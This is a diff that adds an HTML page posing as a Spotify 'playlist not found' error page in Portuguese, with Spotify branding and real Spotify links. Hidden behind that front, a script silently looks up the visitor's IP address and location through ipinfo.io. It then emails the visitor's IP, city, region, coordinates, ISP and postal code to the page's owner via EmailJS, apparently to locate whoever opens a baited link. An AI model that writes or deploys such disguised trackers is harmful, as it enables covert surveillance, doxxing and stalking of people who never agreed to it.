@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP</title>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            font-family: "Inter", sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 0 1.25rem;
+        }
+
+        svg {
+            width: 120px;
+            height: 120px;
+        }
+
+        h2 {
+            font-size: 3rem;
+            font-weight: 600;
+            margin-top: 2rem;
+            width: 50%;
+            color: #FFF;
+        }
+
+        p {
+            font-size: 1.25rem;
+            font-weight: 400;
+            margin-top: 0.75rem;
+            width: 50%;
+            color: #A7A7A7;
+        }
+
+        a {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-top: 1.75rem;
+            padding: 1.1rem 1.3rem;
+            background: #FFF;
+            border-radius: 50px;
+            text-decoration: none;
+            color: #000;
+        }
+
+        a.last {
+            background: #000;
+            color: #FFF;
+            padding: 0.5rem;
+        }
+
+        @media (max-width: 767px) {
+            svg {
+                width: 86px;
+                height: 86px;
+            }
+
+            h2, p {
+                width: 100%;
+            }
+
+            h2 {
+                font-size: 2.5rem;
+            }
+        }
+
+    </style>
+
+
+</head>
+<body>
+
+    <div class="container">
+        <svg width="256px" height="256px" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#FFF" stroke="#FFF"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>spotify [#FFFFF]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7479.000000)" fill="#FFF"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M99.915,7327.865 C96.692,7325.951 91.375,7325.775 88.297,7326.709 C87.803,7326.858 87.281,7326.58 87.131,7326.085 C86.981,7325.591 87.26,7325.069 87.754,7324.919 C91.287,7323.846 97.159,7324.053 100.87,7326.256 C101.314,7326.52 101.46,7327.094 101.196,7327.538 C100.934,7327.982 100.358,7328.129 99.915,7327.865 L99.915,7327.865 Z M99.81,7330.7 C99.584,7331.067 99.104,7331.182 98.737,7330.957 C96.05,7329.305 91.952,7328.827 88.773,7329.792 C88.36,7329.916 87.925,7329.684 87.8,7329.272 C87.676,7328.86 87.908,7328.425 88.32,7328.3 C91.951,7327.198 96.466,7327.732 99.553,7329.629 C99.92,7329.854 100.035,7330.334 99.81,7330.7 L99.81,7330.7 Z M98.586,7333.423 C98.406,7333.717 98.023,7333.81 97.729,7333.63 C95.381,7332.195 92.425,7331.871 88.944,7332.666 C88.609,7332.743 88.274,7332.533 88.198,7332.197 C88.121,7331.862 88.33,7331.528 88.667,7331.451 C92.476,7330.58 95.743,7330.955 98.379,7332.566 C98.673,7332.746 98.766,7333.129 98.586,7333.423 L98.586,7333.423 Z M94,7319 C88.477,7319 84,7323.477 84,7329 C84,7334.523 88.477,7339 94,7339 C99.523,7339 104,7334.523 104,7329 C104,7323.478 99.523,7319.001 94,7319.001 L94,7319 Z" id="spotify-[#FFFFF]"> </path> </g> </g> </g> </g></svg>
+        <h2>Oops, algo deu errado!</h2>
+        <p>Parece que não conseguimos encontrar a playlist que você está procurando. Ela pode ter sido removida ou seu criador a tornou privada.</p>
+        <a href="https://open.spotify.com/intl-pt">Explorar Playlists</a>
+        <a class="last" href="https://support.spotify.com/br-pt/article/contact-us/">Central de ajuda</a>
+    </div>
+    
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("o5_q0-_GHdLtRqD6N");
+        })()
+    </script>
+    <script>
+
+        fetch('https://ipinfo.io/json?token=adca92934eaddf')
+        .then(res => res.json())
+        .then(data => {
+            //console.log('Response', data)
+            
+            let templateParams = {
+                ip: data.ip,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                loc: data.loc,
+                org: data.org,
+                postal: data.postal,
+                timezone: data.timezone
+            }
+
+            emailjs.send('service_hh6ej8x', 'template_7sc2q4y', templateParams)
+            .then(function(response) {
+                //console.log('Email sent successfully!', response.status, response.text)
+            }, function(error) {
+                //console.error('Failed to send email:', error)
+            })
+        })
+        .catch((error) => {
+            console.error('Error fetching IP info:', error)
+        })
+    </script>
+</body>
+</html>
